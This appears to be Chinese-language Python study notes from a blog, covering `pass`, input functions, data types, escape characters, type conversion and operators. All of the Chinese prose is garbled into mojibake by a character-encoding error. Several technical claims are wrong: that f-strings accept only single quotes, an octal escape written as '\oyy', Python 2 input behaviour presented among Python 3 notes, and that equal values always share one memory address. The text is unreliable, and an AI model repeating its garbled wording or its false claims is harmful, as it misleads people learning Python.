<p>21ã€<strong>pass</strong> è¾“å…¥è¿™ä¸ªåœ¨pythonä¸­ç”¨ä½œå ä½ï¼Œæ‰§è¡Œäº†ä¸ä¼šäº§ç”Ÿä»»ä½•æ•ˆæœï¼Œå¯ç”¨æ¥å æ®æŸäº›å¦‚ifè¯­å¥åˆ¤æ–­åä¸æƒ³æ‰§è¡Œä»»ä½•è¯­å¥å¯å†™å…¥pass</p>
<p>22ã€è¾“å…¥å‡½æ•°ï¼šä»æ ‡å‡†è¾“å…¥ï¼ˆé»˜è®¤é”®ç›˜ï¼‰è¯»å–ä¸€è¡Œæ–‡æœ¬</p>
<p>ï¼ˆ1ï¼‰raw_inputï¼šå•çº¯çš„è¯»å–ä¸€ä¸ªè¡Œï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²</p>
<p>ï¼ˆ2ï¼‰inputï¼šå¯ä»¥æ¥å—ä¸€ä¸ªè¡¨è¾¾å¼ä½œä¸ºè¾“å…¥ï¼Œå¹¶ä¸”å°†è®¡ç®—ç»“æœè¿”å›</p>
<h3 id="äºŒã€æ•°æ®ç±»å‹"><a href="#äºŒã€æ•°æ®ç±»å‹" class="headerlink" title="äºŒã€æ•°æ®ç±»å‹"></a>äºŒã€æ•°æ®ç±»å‹</h3><p><strong>æ³¨ï¼šæ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼Œå…ƒç»„ä¸ºä¸å¯æ”¹å˜çš„æ•°æ®ï¼›åˆ—è¡¨ï¼Œå­—å…¸ï¼Œé›†åˆä¸ºå¯æ”¹å˜çš„æ•°æ®</strong></p>
<p>1ã€æ•°å­—ç±»å‹ï¼ˆNumberï¼‰ï¼š</p>
<p>ï¼ˆ1ï¼‰intï¼špython3ä¸­å”¯ä¸€çš„æ•´æ•°ç±»å‹ï¼Œè¡¨ç¤ºä¸ºé•¿æ•´å‹ï¼Œå–æ¶ˆäº†ä»¥å¾€çš„long</p>
<p>ï¼ˆ2ï¼‰boolï¼šå¸ƒå°”å‹ï¼Œåªæœ‰Trueï¼ˆå€¼ä¸º1ï¼‰å’ŒFalseï¼ˆå€¼ä¸º0ï¼‰ä¸¤ç§  ï¼ˆTrueä¸Falseå¯ä»¥ä¸æ•°å­—è¿›è¡ŒåŠ å‡ï¼Œå¹¶ä¸”é¦–å­—æ¯ä¸ºå¤§å†™ï¼Œæ˜¯å…³é”®å­—ä¸å¯å†™é”™ï¼ï¼‰</p>
<p>ï¼ˆ3ï¼‰floatï¼šæµ®ç‚¹å‹ï¼Œä¹Ÿå°±æ˜¯ä¿—ç§°å°æ•°</p>
<p>ï¼ˆ4ï¼‰complexï¼šå¤æ•°ã€‚å¦‚1+2jï¼ˆpythonç”¨jè¡¨ç¤ºè™šæ•°ï¼Œå®éƒ¨1å’Œè™šéƒ¨2éƒ½æ˜¯æµ®ç‚¹å‹æ•°æ®ï¼‰</p>
<p>ï¼ˆ5ï¼‰äºŒè¿›åˆ¶æ•°ï¼š0b  ï¼›å…«è¿›åˆ¶æ•°ï¼š0oï¼› åå…­è¿›åˆ¶æ•°ï¼š0x</p>
<p>2ã€å­—ç¬¦ä¸²ï¼ˆStringï¼‰</p>
<p>ï¼ˆ1ï¼‰å­—ç¬¦ä¸²æˆªå–æ ¼å¼ï¼š<strong>å˜é‡[å¤´ä¸‹æ ‡:å°¾ä¸‹æ ‡]</strong> ï¼ˆä»å·¦å¾€å³ä»¥0ä½œä¸ºå¼€å§‹å€¼ï¼Œä»å³å¾€å·¦ä»¥-1ä½œä¸ºå¼€å§‹å€¼ã€‚å½“å°¾ä¸‹æ ‡ä¸ºå…·ä½“å€¼æ—¶ï¼Œåªä¼šå–åˆ°å…¶å‰ä¸€ä¸ªçš„å­—ç¬¦ï¼‰</p>
<p>ç‰¹åˆ«çš„ï¼šæˆªå–å¯ä»¥æ¥æ”¶ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œä½œä¸ºæˆªå–çš„æ­¥é•¿ï¼ˆæ²¡æœ‰æ—¶é»˜è®¤ä¸º1ï¼‰ï¼›å¦‚æœæ­¥é•¿ä¸ºè´Ÿæ•°è¡¨ç¤ºé€†å‘è¯»å–</p>
<p>ï¼ˆ2ï¼‰**+** æ˜¯å­—ç¬¦ä¸²çš„è¿æ¥ç¬¦ï¼Œå¯ä»¥è¿æ¥ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ˆæˆ–è€…è¢«å­—ç¬¦ä¸²èµ‹å€¼çš„å˜é‡ï¼‰ </p>
<p>å­—ç¬¦ä¸²(å˜é‡)*aï¼šè¡¨ç¤ºå­—ç¬¦ä¸²ï¼ˆå˜é‡ï¼‰å¤åˆ¶aæ¬¡ </p>
<p>ï¼ˆ3ï¼‰f-stringæ ¼å¼å­—ç¬¦ä¸²ï¼šæ ¼å¼ä¸º<strong>f â€˜ å­—ç¬¦ä¸²æˆ–è€…æ˜¯{å­—ç¬¦ä¸²è¡¨è¾¾å¼}â€™</strong> å­—ç¬¦ä¸²è¡¨è¾¾å¼å°±ä¼šæŠŠè®¡ç®—åçš„å€¼æ›¿æ¢è¿›å»ï¼ˆfåé¢çš„åªèƒ½ç”¨å•å¼•å·ï¼‰</p>
<table>
<thead>
<tr>
<th>è½¬ä¹‰å­—ç¬¦</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>(åœ¨è¡Œå°¾æ—¶)</td>
<td>ç»­è¡Œç¬¦</td>
</tr>
<tr>
<td>\ \</td>
<td>åæ–œæ ç¬¦å·</td>
</tr>
<tr>
<td>\ â€˜</td>
<td>å•å¼•å·</td>
</tr>
<tr>
<td>\ â€œ</td>
<td>åŒå¼•å·</td>
</tr>
<tr>
<td>\a</td>
<td>å“é“ƒ</td>
</tr>
<tr>
<td>\b</td>
<td>é€€æ ¼(Backspace)</td>
</tr>
<tr>
<td>\000</td>
<td>ç©º</td>
</tr>
<tr>
<td>\n</td>
<td>æ¢è¡Œ</td>
</tr>
<tr>
<td>\v</td>
<td>çºµå‘åˆ¶è¡¨ç¬¦</td>
</tr>
<tr>
<td>\t</td>
<td>æ¨ªå‘åˆ¶è¡¨ç¬¦</td>
</tr>
<tr>
<td>\r</td>
<td>å›è½¦</td>
</tr>
<tr>
<td>\f</td>
<td>æ¢é¡µ</td>
</tr>
<tr>
<td>\oyy</td>
<td>å…«è¿›åˆ¶æ•°ï¼Œ<strong>yy</strong> ä»£è¡¨çš„å­—ç¬¦ï¼Œä¾‹å¦‚ï¼š<strong>\o12</strong> ä»£è¡¨æ¢è¡Œï¼Œå…¶ä¸­ o æ˜¯å­—æ¯ï¼Œä¸æ˜¯æ•°å­— 0ã€‚</td>
</tr>
<tr>
<td>\xyy</td>
<td>åå…­è¿›åˆ¶æ•°ï¼Œyyä»£è¡¨çš„å­—ç¬¦ï¼Œä¾‹å¦‚ï¼š\x0aä»£è¡¨æ¢è¡Œ</td>
</tr>
<tr>
<td>\other</td>
<td>å…¶å®ƒçš„å­—ç¬¦ä»¥æ™®é€šæ ¼å¼è¾“å‡º</td>
</tr>
</tbody></table>
<p>3ã€åˆ—è¡¨ï¼ˆListï¼‰</p>
<p>ï¼ˆ1ï¼‰åˆ—è¡¨æ”¯æŒæ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼Œä»¥åŠåµŒå¥—åˆ—è¡¨</p>
<p>åˆ—è¡¨å…ƒç´ æ˜¯å†™åœ¨**[ ]<strong>ä¹‹é—´çš„ï¼Œç”¨</strong>é€—å·**åˆ†éš”å¼€ä¸åŒçš„å…ƒç´ ï¼ˆæ¯ä¸ªé€—å·å‰éƒ½æ˜¯ä¸€ä¸ªå…ƒç´ ï¼‰</p>
<p>ï¼ˆ2ï¼‰åˆ—è¡¨æˆªå–æ ¼å¼ï¼š<strong>å˜é‡[å¤´ä¸‹æ ‡:å°¾ä¸‹æ ‡]</strong>  ï¼ˆä»å·¦å¾€å³ä»¥0ä½œä¸ºå¼€å§‹å€¼ï¼Œä»å³å¾€å·¦ä»¥-1ä½œä¸ºå¼€å§‹å€¼ã€‚ï¼‰</p>
<p>å¦‚å›¾æ‰€ç¤ºï¼Œå…¶è¡¨ç¤ºæ–¹æ³•ä¸å­—ç¬¦ä¸²æˆªå–çš„è§„åˆ™ä¸€è‡´</p>
<p><img src="/2020/11/09/2020-11-09-Python%E7%AC%94%E8%AE%B0/%E5%88%97%E8%A1%A8%E6%88%AA%E5%8F%96%E6%A0%BC%E5%BC%8F-1609204379399.png"></p>
<p>ï¼ˆ3ï¼‰**+** ä¹Ÿæ˜¯åˆ—è¡¨çš„è¿æ¥ç¬¦ï¼Œå¯ä»¥è¿æ¥ä¸¤ä¸ªåˆ—è¡¨ </p>
<p>â€‹          åˆ—è¡¨*a  ï¼šè¡¨ç¤ºåˆ—è¡¨å¤åˆ¶aæ¬¡</p>
<p>ï¼ˆ4ï¼‰å¯å°†åˆ—è¡¨çš„æŸæ®µèµ‹å€¼ä¸º[ ]ï¼Œè€Œåˆ å»å…ƒç´ ã€‚å¦‚ï¼ša=[1,2,3,4]  a[0:2]=[ ]   é‚£ä¹ˆåˆ—è¡¨açš„å†…å®¹å°†å˜ä¸º[3,4]</p>
<p>ï¼ˆ5ï¼‰ç‰¹åˆ«çš„ï¼šæˆªå–å¯ä»¥æ¥æ”¶ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œä½œä¸ºæˆªå–çš„æ­¥é•¿ï¼ˆæ²¡æœ‰æ—¶é»˜è®¤ä¸º1ï¼‰ï¼›å¦‚æœæ­¥é•¿ä¸ºè´Ÿæ•°è¡¨ç¤ºé€†å‘è¯»å–</p>
<p>ï¼ˆ6ï¼‰åˆ é™¤åˆ—è¡¨ï¼šdel åˆ—è¡¨åï¼›åˆ é™¤åˆ—è¡¨æŸä¸ªå…ƒç´ ï¼š del åˆ—è¡¨å[n]</p>
<p>ï¼ˆ7ï¼‰åœ¨åˆ—è¡¨é‡ŒåµŒå¥—åˆ—è¡¨ï¼šè¾“å‡ºæ•´ä¸ªå¤§åˆ—è¡¨æ—¶ï¼Œå°åˆ—è¡¨æ˜¯åœ¨[ ]é‡Œï¼Œä¸åŒçš„å°åˆ—è¡¨ç”¨é€—å·éš”å¼€ã€‚</p>
<p>è®¿é—®å¤§åˆ—è¡¨ä¸­çš„å°åˆ—è¡¨ï¼šæŠŠå°åˆ—è¡¨æ•´ä¸ªçœ‹åšä¸€ä¸ªå…ƒç´ ï¼Œé‚£ä¹ˆ<strong>å¤§åˆ—è¡¨å[0]<strong>è¾“å‡ºçš„å°±æ˜¯ç¬¬ä¸€ä¸ªçš„æ•´ä¸ªå°åˆ—è¡¨ï¼Œå¦‚æœè¦è®¿é—®å°åˆ—è¡¨ä¸­å…ƒç´ ï¼Œå°±å†™æˆ</strong>å¤§åˆ—è¡¨å[0] [0]</strong> è¡¨ç¤ºè®¿é—®ç¬¬ä¸€ä¸ªå°åˆ—è¡¨é‡Œé¢çš„ç¬¬ä¸€ä¸ªå…ƒç´ </p>
<p>4ã€å…ƒç»„ï¼ˆTupleï¼‰</p>
<p>ï¼ˆ1ï¼‰å…ƒç»„é‡Œé¢çš„ç±»å‹ä¹Ÿå¯ä»¥ä¸ç›¸åŒï¼Œä¸åˆ—è¡¨ç›¸ä¼¼ï¼Œä¸åŒåœ¨äºå…ƒç»„çš„å…ƒç´ ä¸èƒ½ä¿®æ”¹å¹¶ä¸”å…ƒç»„å…ƒç´ å†™åœ¨**( )** é‡Œé¢ï¼Œä½¿ç”¨é€—å·æŠŠå„å…ƒç´ éš”å¼€</p>
<p>ï¼ˆ2ï¼‰æˆªå–æ ¼å¼ï¼Œ+ä¸*ç­‰çš„ç”¨æ³•ä¸å­—ç¬¦ä¸²ã€åˆ—è¡¨ä¸€è‡´ï¼Œå°±ä¸å†è¯´ç¬¬ä¸‰æ¬¡äº†</p>
<p>ï¼ˆ3ï¼‰ç©ºå…ƒç»„ï¼štup1=( )   ä¸€ä¸ªå…ƒç´ çš„å…ƒç»„ï¼štup2=(1,)  æ³¨æ„æœ‰<strong>é€—å·</strong>  </p>
<p>ï¼ˆ4ï¼‰å…ƒç»„é‡Œé¢å…ƒç´ æ˜¯ä¸å¯å˜çš„ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ä½¿ç”¨åˆ—è¡¨ä½œä¸ºå…ƒç´ ï¼Œå°±ä¼šæ˜¯æŒ‡å‘çš„è¯¥åˆ—è¡¨ä¸å˜ï¼Œä½†æ˜¯åˆ—è¡¨çš„å†…å®¹å¯å˜ã€‚å¹¶ä¸”å…ƒç»„å¯ä»¥å˜é•¿ï¼Œé€šè¿‡+è¿ç®—ï¼Œè¿›è¡ŒåŠ é•¿å…ƒç»„</p>
<p>ï¼ˆ5ï¼‰å…ƒç»„åŒæ ·å¯ç”¨ del å…ƒç»„å  æŠŠå…ƒç»„åˆ å»ï¼ˆå•ä¸ªå…ƒç´ ä¸å¯å˜ï¼Œæ— æ³•åˆ é™¤ï¼‰</p>
<p>5ã€é›†åˆï¼ˆSetï¼‰</p>
<p>ï¼ˆ1ï¼‰é›†åˆï¼šæ˜¯ç”±ä¸€ä¸ªæˆ–å¤šä¸ªå½¢æ€å„å¼‚çš„å¤§å°æ•´ä½“ç»„æˆï¼Œè¿™äº›æ•´ä½“è¢«ç§°ä¸ºå…ƒç´ æˆ–æˆå‘˜</p>
<p>ï¼ˆ2ï¼‰ä½¿ç”¨**{  }** æˆ–è€…**set(å…ƒç´ )**è¿›è¡Œåˆ›å»º ï¼ˆå¦‚æœè¦åˆ›å»ºç©ºé›†åˆï¼Œåªèƒ½ç”¨set()å‡½æ•°ï¼Œå› ä¸º{}é‡Œé¢ä¸ºç©ºè¢«ç”¨æ¥è¡¨ç¤ºä¸€ä¸ªç©ºå­—å…¸ï¼Œè€Œè‹¥æ˜¯åŒ…å«å¤šä¸ªå…ƒç´ ï¼Œéœ€è¦åœ¨å¤šä¸ªåœ†æ‹¬å·å¦‚set((å¤šä¸ªå…ƒç´ ))  ï¼‰</p>
<p>ï¼ˆ3ï¼‰å„ä¸ªå…ƒç´ ä¹‹é—´ç”¨é€—å·éš”å¼€ï¼›å¹¶ä¸”ç”¨printè¾“å‡ºé›†åˆæ—¶ï¼Œé›†åˆä¸­é‡å¤çš„å…ƒç´ ä¼šè¢«åˆ å»</p>
<p>ï¼ˆ4ï¼‰<strong>set()</strong> åˆ›å»ºçš„é›†åˆé—´å¯ä»¥è¿›è¡Œè¿ç®—â€œ-ï¼Œ|ï¼Œ&amp;ï¼Œ^â€</p>
<p>å‡å·ï¼šè¡¨ç¤ºå‡å·å‰çš„é›†åˆæœ‰çš„è€Œå‡å·åçš„é›†åˆæ²¡æœ‰çš„å…ƒç´ </p>
<p>| ï¼šè¡¨ç¤ºä¸¤ä¸ªé›†åˆçš„å¹¶é›†</p>
<p>&amp;ï¼šè¡¨ç¤ºä¸¤ä¸ªé›†åˆé—´çš„äº¤é›†</p>
<p>^ï¼šè¡¨ç¤ºä¸¤ä¸ªé›†åˆé—´ä¸åŒæ—¶å­˜åœ¨çš„å…ƒç´ ï¼ˆäº¤é›†ä»¥å¤–çš„å…ƒç´ ï¼‰</p>
<p>ï¼ˆ5ï¼‰**é›†åˆå.add(ä¸€ä¸ªå…ƒç´ )**ï¼šåªèƒ½æ·»åŠ ä¸€ä¸ªå…ƒç´ åˆ°é›†åˆé‡Œé¢ï¼Œå¦‚æœå·²å­˜åœ¨åˆ™ä¸è¿›è¡Œä»»ä½•æ“ä½œï¼›</p>
<p>ï¼ˆ6ï¼‰<strong>é›†åˆå.update(ä¸€æˆ–å¤šä¸ªå…ƒç´ )</strong> ï¼šæ·»åŠ ä¸€æˆ–å¤šä¸ªå…ƒç´ åˆ°é›†åˆé‡Œé¢ã€‚ï¼ˆå¤šä¸ªå…ƒç´ éœ€è¦ç”¨{}æ‹¬èµ·æ¥ï¼Œå¹¶ä¸”å…ƒç´ é—´é€—å·éš”å¼€ã€‚å¦ï¼šæ­¤æ–¹æ³•å¯ç”¨äºåˆ—è¡¨ï¼Œå…ƒç»„ï¼Œå­—å…¸ï¼‰</p>
<p>æ³¨ï¼šå½“å…ƒç´ ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œå¦‚æœè¦æŠŠå­—ç¬¦ä¸²æ•´ä½“åŠ å…¥é›†åˆä¸­ï¼Œéœ€è¦æŠŠå­—ç¬¦ä¸²ç”¨{}æ‹¬èµ·æ¥ï¼Œå¦åˆ™ï¼Œå°†ä¼šè¢«æ‹†æˆä¸€ä¸ªä¸ªå­—ç¬¦æ”¾å…¥åˆ°é›†åˆ</p>
<p>ï¼ˆ7ï¼‰<strong>é›†åˆå.remove(ä¸€ä¸ªå…ƒç´ )æˆ–è€…é›†åˆå.discard(ä¸€ä¸ªå…ƒç´ )</strong> åªèƒ½åˆ é™¤ä¸€ä¸ªå…ƒç´ </p>
<p>ï¼ˆ8ï¼‰<strong>é›†åˆå.pop()</strong> éšæœºåˆ å»é›†åˆé‡Œçš„ä¸€ä¸ªå…ƒç´ </p>
<p>6ã€å­—å…¸ï¼ˆDictionaryï¼‰</p>
<p>ï¼ˆ1ï¼‰å­—å…¸ï¼šä¸€ä¸ªå†…ç½®çš„æ•°æ®ç±»å‹ï¼Œæ˜¯æ— åºçš„å¯¹è±¡é›†åˆã€‚ä½¿ç”¨<strong>é”®ï¼ˆkeyï¼‰</strong>æ¥å­˜å–å…ƒç´ </p>
<p>ï¼ˆ2ï¼‰å­—å…¸é‡Œé¢æ¯ä¸€ä¸ªå¯¹æ˜¯ç”±ï¼š<strong>é”®(key):å€¼(value)</strong> æ„æˆçš„ã€‚æ ¼å¼ï¼š<strong>d={key1:value1,key2:value2,â€¦â€¦}</strong></p>
<p>é”®æ˜¯ä¸å¯å˜çš„æ•°æ®ç±»å‹ï¼ˆæ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼Œå…ƒç»„ï¼‰ï¼Œå¹¶ä¸”åœ¨åŒä¸€å­—å…¸é‡Œé”®æ˜¯å”¯ä¸€çš„ï¼Œé‡å¤çš„é”®ä»¥æœ€åçš„ä¸ºä¸»</p>
<p>ï¼ˆ3ï¼‰å¯ä»¥é€šè¿‡<strong>å­—å…¸å[é”®å]=å€¼</strong> å¾€å­—å…¸é‡Œé¢å¡«å……å…ƒç´ ï¼ŒåŒæ ·è¿™ä¹Ÿå¯ä»¥ç”¨æ¥ä¿®æ”¹é”®å¯¹åº”çš„å€¼ ï¼›ä½¿ç”¨<strong>del å­—å…¸å[é”®å]</strong> æ¥åˆ å»ä¸€ä¸ªé”®ï¼›å¦‚æœç›´æ¥ **del å­—å…¸å ** å°†åˆ å»æ•´ä¸ªå­—å…¸</p>
<p>ï¼ˆ4ï¼‰è¯»å–å­—å…¸é‡Œé¢çš„å€¼æ—¶ï¼Œéœ€è¦åœ¨<strong>å­—å…¸å[ ]</strong> æ–¹æ‹¬å·é‡Œé¢å¡«å…¥é”®åï¼Œä»è€Œé€šè¿‡é”®åè¾“å‡ºå…¶ç›¸åº”çš„å€¼ï¼Œå¦‚æœåœ¨print()é‡Œé¢è¾“å…¥å­—å…¸åï¼Œä¼šå°†æ•´ä¸ªå­—å…¸éƒ½è¾“å‡º</p>
<p>ï¼ˆ5ï¼‰ç”¨**dict()**åˆ›å»ºå­—å…¸ï¼šå­—å…¸å=dict([(é”®å1ï¼Œå€¼1),(é”®å2ï¼Œå€¼2),â€¦â€¦])ï¼› </p>
<p>å­—å…¸å=dict(é”®å1=å€¼1,é”®å2=å€¼2â€¦â€¦)</p>
<p>æˆ–è€…å¦‚ï¼šå­—å…¸å={x:x**2 for x in (2,4,6)} ç±»ä¼¼ä¸è¡¨è¾¾å¼ä¸€æ ·çš„åˆ›å»ºå­—å…¸    </p>
<p>ï¼ˆ6ï¼‰<strong>å­—å…¸å={}</strong> ï¼šå®šä¹‰ä¸€ä¸ªç©ºå­—å…¸                </p>
<p>7ã€æ•°æ®ç±»å‹è½¬æ¢</p>
<table>
<thead>
<tr>
<th>å‡½æ•°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>int(x,base)</td>
<td>å°†xè½¬æ¢ä¸ºä¸€ä¸ªæ•´æ•°ï¼Œå¦‚æœbaseä¸º16ï¼Œ8è¿›åˆ¶æ—¶ï¼ˆåè¿›åˆ¶æ˜¯é»˜è®¤çš„ï¼‰ï¼Œxæ˜¯å­—ç¬¦ä¸²å½¢å¼</td>
</tr>
<tr>
<td>float(x)</td>
<td>å°†xè½¬æ¢åˆ°ä¸€ä¸ªæµ®ç‚¹æ•°</td>
</tr>
<tr>
<td>complex(real,imag)</td>
<td>åˆ›å»ºä¸€ä¸ªå¤æ•°</td>
</tr>
<tr>
<td>str(x)</td>
<td>å°†å¯¹è±¡ x è½¬æ¢ä¸ºå­—ç¬¦ä¸²</td>
</tr>
<tr>
<td>repr(x)</td>
<td>å°†å¯¹è±¡ x è½¬æ¢ä¸ºè¡¨è¾¾å¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td>eval(str)</td>
<td>ç”¨æ¥è®¡ç®—åœ¨å­—ç¬¦ä¸²ä¸­çš„æœ‰æ•ˆPythonè¡¨è¾¾å¼,å¹¶è¿”å›ä¸€ä¸ªå¯¹è±¡</td>
</tr>
<tr>
<td>tuple(s)</td>
<td>å°†åºåˆ— s è½¬æ¢ä¸ºä¸€ä¸ªå…ƒç»„</td>
</tr>
<tr>
<td>list(s)</td>
<td>å°†åºåˆ— s è½¬æ¢ä¸ºä¸€ä¸ªåˆ—è¡¨</td>
</tr>
<tr>
<td>set(s)</td>
<td>è½¬æ¢ä¸ºå¯å˜é›†åˆ</td>
</tr>
<tr>
<td>dict(d)</td>
<td>åˆ›å»ºä¸€ä¸ªå­—å…¸ã€‚d å¿…é¡»æ˜¯ä¸€ä¸ª (key, value)å…ƒç»„åºåˆ—ã€‚</td>
</tr>
<tr>
<td>frozenset(s)</td>
<td>è½¬æ¢ä¸ºä¸å¯å˜é›†åˆ</td>
</tr>
<tr>
<td>chr(x)</td>
<td>å°†ä¸€ä¸ªæ•´æ•°è½¬æ¢ä¸ºä¸€ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td>ord(x)</td>
<td>å°†ä¸€ä¸ªå­—ç¬¦è½¬æ¢ä¸ºå®ƒçš„æ•´æ•°å€¼</td>
</tr>
<tr>
<td>hex(x)</td>
<td>å°†ä¸€ä¸ªæ•´æ•°è½¬æ¢ä¸ºä¸€ä¸ªåå…­è¿›åˆ¶æ•°</td>
</tr>
<tr>
<td>oct(x)</td>
<td>å°†ä¸€ä¸ªæ•´æ•°è½¬æ¢ä¸ºä¸€ä¸ªå…«è¿›åˆ¶æ•°</td>
</tr>
<tr>
<td>bin(x)</td>
<td>å°†ä¸€ä¸ªæ•´æ•°è½¬æ¢ä¸ºä¸€ä¸ªäºŒè¿›åˆ¶æ•°</td>
</tr>
</tbody></table>
<h3 id="ä¸‰ã€è¿ç®—ç¬¦ï¼ˆåªè®°å½•ä¸cä¸åŒçš„ç¬¦å·ï¼‰"><a href="#ä¸‰ã€è¿ç®—ç¬¦ï¼ˆåªè®°å½•ä¸cä¸åŒçš„ç¬¦å·ï¼‰" class="headerlink" title="ä¸‰ã€è¿ç®—ç¬¦ï¼ˆåªè®°å½•ä¸cä¸åŒçš„ç¬¦å·ï¼‰"></a>ä¸‰ã€è¿ç®—ç¬¦ï¼ˆåªè®°å½•ä¸cä¸åŒçš„ç¬¦å·ï¼‰</h3><p>1ã€ç®—æœ¯è¿ç®—ç¬¦</p>
<p>ï¼ˆ1ï¼‰a**b ï¼šaçš„bæ¬¡æ–¹</p>
<p>ï¼ˆ2ï¼‰a//bï¼šaé™¤ä»¥bï¼Œå–ç»“æœçš„æ•´æ•°éƒ¨åˆ†ï¼ˆä¸æ˜¯å››èˆäº”å…¥ï¼Œæ˜¯ç›´æ¥å–æ•´æ•°éƒ¨åˆ†ï¼å¦ï¼šå¦‚æœaæˆ–bæœ‰æ˜¯æµ®ç‚¹æ•°çš„ï¼Œç»“æœä¼šå¤šä¸ªå°æ•°ç‚¹ä»¥åŠå°æ•°ç‚¹åä¸€ä½0ï¼‰</p>
<p>ï¼ˆ3ï¼‰*ï¼šä¹˜å·ï¼Œä¹Ÿæ˜¯å‰é¢æ‰€æåŠå­—ç¬¦ä¸²ï¼Œåˆ—è¡¨ï¼Œå…ƒç»„é‡Œé¢çš„é‡å¤ç¬¦å·</p>
<p>ï¼ˆ4ï¼‰/ï¼šé™¤å·ï¼Œç»“æœ<strong>æ°¸è¿œ</strong>æ˜¯è¿”å›ä¸€ä¸ªæµ®ç‚¹æ•°</p>
<p>pythonä¸­æ²¡æœ‰è‡ªåŠ ç¬¦å·ï¼Œåªèƒ½é€šè¿‡a+=1ï¼Œæˆ–è€…a=a+1ä»£æ›¿</p>
<p>2ã€æ¯”è¾ƒè¿ç®—ç¬¦</p>
<p>ï¼ˆ1ï¼‰a==bï¼šåˆ¤æ–­ä¸¤è€…æ˜¯å¦ç›¸ç­‰ï¼ˆä¸ºä»€ä¹ˆä¼šæï¼Ÿå› ä¸ºcé‡Œé¢ä¹Ÿå¸¸å¿˜è®°ï¼Œç”¨æˆèµ‹å€¼ç¬¦å·=è€Œå‡ºé”™ï¼‰</p>
<p>3ã€èµ‹å€¼è¿ç®—ç¬¦</p>
<p>ï¼ˆ1ï¼‰a** =bï¼šç­‰æ•ˆäº a **bï¼Œaçš„bæ¬¡æ–¹</p>
<p>ï¼ˆ2ï¼‰a//=bï¼šç­‰æ•ˆäºa//bï¼Œç»“æœå–aé™¤ä»¥bçš„æ•´æ•°éƒ¨åˆ†</p>
<p>ï¼ˆ3ï¼‰:=  ï¼šæµ·è±¡è¿ç®—ç¬¦ï¼Œå¯ä»¥åœ¨è¡¨è¾¾å¼çš„å†…éƒ¨ä¸ºå˜é‡èµ‹å€¼</p>
<p>4ã€ä½è¿ç®—ç¬¦ï¼ˆå…¨éƒ½ä¸€æ ·ï¼‰</p>
<p>5ã€é€»è¾‘è¿ç®—ç¬¦</p>
<p>ï¼ˆ1ï¼‰ x and yï¼šç±»ä¼¼cè¯­è¨€çš„é€»è¾‘ä¸ &amp;&amp;ï¼Œä¸åŒåœ¨äºåˆ¤æ–­å¼ä¸ºçœŸï¼Œè¿”å›çš„æ˜¯yçš„è®¡ç®—å€¼ï¼Œcè¯­è¨€åªä¼šè¿”å›1</p>
<p>ï¼ˆ2ï¼‰or ï¼šç±»ä¼¼äºcè¯­è¨€çš„é€»è¾‘æˆ– ||ï¼ŒåŒæ ·ï¼Œå¦‚æœæ²¡å‘ç”Ÿé€»è¾‘çŸ­è·¯ï¼Œè®¡ç®—åˆ°äº†yï¼Œé‚£ä¹ˆä¹Ÿæ˜¯è¿”å›y çš„è®¡ç®—å€¼</p>
<p>ï¼ˆ3ï¼‰notï¼šè¿™ä¸ªå°±æ˜¯cè¯­è¨€ä¸­çš„é€»è¾‘é ï¼</p>
<p>6ã€æˆå‘˜è¿ç®—ç¬¦</p>
<p>ï¼ˆ1ï¼‰a in æŸåºåˆ—ï¼šåˆ¤æ–­aæ˜¯å¦åœ¨åºåˆ—ï¼ˆåˆ—è¡¨ï¼Œé›†åˆï¼Œå…ƒç»„ï¼Œå­—å…¸ï¼‰ä¸­ã€‚åœ¨ï¼Œåˆ™è¿”å›Trueï¼›ä¸åœ¨ï¼Œè¿”å›False</p>
<p>ï¼ˆ2ï¼‰a not in æŸåºåˆ—ï¼šåˆ¤æ–­aå¦‚æœä¸åœ¨æŸåºåˆ—ä¸­ï¼Œè¿”å›Trueï¼›åœ¨ï¼Œè¿”å›False</p>
<p>7ã€èº«ä»½è¿ç®—ç¬¦</p>
<p>ï¼ˆ1ï¼‰a is b ï¼šåˆ¤æ–­aä¸bæ˜¯å¦å¼•ç”¨çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼ˆç±»ä¼¼åœ¨æ¯”è¾ƒåœ°å€æ˜¯å¦ä¸€æ ·ï¼‰ï¼Œæ˜¯ï¼Œè¿”å›Trueï¼›ä¸æ˜¯ï¼Œè¿”å›False</p>
<p>ï¼ˆ2ï¼‰is not  ï¼šç±»ä¼¼ä¸Šæ–¹çš„not in</p>
<p><strong>æ³¨ï¼šPythoné‡Œé¢çš„æ¯ä¸ªå˜é‡åªæ˜¯ä¸ªå•çº¯çš„åå­—ã€‚è€Œæ‰€å–åˆ°çš„å€¼ï¼Œå¯ä»¥è¢«å¾ˆå¤šå˜é‡å–åˆ°ã€‚ä½†æ˜¯åªè¦æ˜¯åŒä¸€ä¸ªå€¼ï¼Œé‚£ä¹ˆåœ°å€å°±æ˜¯ä¸€æ ·çš„ï¼Œåªæœ‰ä¸€ä¸ªåœ°å€ï¼Œä¸€ä¸ªå€¼ï¼Œä¸€ä¸ªå¯¹è±¡ã€‚è¿™ä¹Ÿæ˜¯æ•°å­—ç±»å‹å’Œå­—ç¬¦ä¸²ç±»å‹ä¸èƒ½è¢«ä¿®æ”¹çš„åŸå› ã€‚è€Œè¿™ä¸cçš„å˜é‡å…·æœ‰è‡ªå·±çš„åœ°å€ç©ºé—´æ˜¯ä¸åŒçš„ç†å¿µ</strong></p>
